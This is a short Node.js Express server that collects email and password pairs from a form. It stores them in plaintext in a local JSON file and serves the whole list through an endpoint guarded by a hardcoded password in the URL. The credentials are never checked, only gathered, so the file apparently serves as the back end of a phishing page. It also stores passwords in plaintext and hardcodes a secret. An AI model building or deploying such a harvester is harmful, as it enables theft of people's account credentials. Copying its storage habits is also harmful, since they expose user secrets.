const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Password for entries page
const ENTRIES_PASSWORD = "mypassword123"; // change this

// Parse form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const DATA_FILE = path.join(__dirname, 'data.json');

// Ensure data.json exists
if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, "[]");

// Save entry
function saveEntry(entry) {
    const entries = JSON.parse(fs.readFileSync(DATA_FILE));
    entries.push(entry);
    fs.writeFileSync(DATA_FILE, JSON.stringify(entries, null, 2));
}

// --------------------
// Form submission endpoint
// --------------------
app.post('/submit', (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).end();

    saveEntry({ email, password, time: new Date().toLocaleString() });

    // Stay on same page after submission
    res.redirect('/'); 
});

// --------------------
// Entries API (password protected)
// --------------------
app.get('/api/entries', (req, res) => {
    const password = req.query.password;
    if (password !== ENTRIES_PASSWORD) return res.status(403).json({ error: "Unauthorized" });

    const entries = JSON.parse(fs.readFileSync(DATA_FILE));
    res.json(entries);
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
